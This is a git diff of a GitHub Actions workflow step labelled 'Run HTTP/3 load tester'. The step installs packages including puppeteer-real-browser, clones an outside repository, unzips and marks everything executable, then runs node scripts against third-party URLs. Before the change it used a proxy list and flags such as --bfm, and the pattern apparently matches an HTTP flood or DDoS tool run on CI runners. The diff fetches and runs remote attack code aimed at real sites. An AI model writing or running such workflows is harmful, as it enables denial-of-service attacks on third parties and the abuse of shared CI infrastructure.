@@ -30,14 +30,14 @@ jobs:
       
       - name: Run HTTP/3 load tester
         run: |
-          npm i chalk@4 colors request   hpack cluster   
+          npm i chalk@4 colors request   hpack cluster   puppeteer-real-browser
           pip install requests
           git clone https://github.com/Fegp1p2/ideal-guide.git
           chmod +x *
           unzip Fc-main.zip 
           
           cd Fc-main
-          node a.js GET https://vexloader.myvipsite.fun/login  600 4 60  proxy.txt --full --debug  --bfm
+          node m.js  https://aurixprivate.online/susu  3 3 3
           
 
           
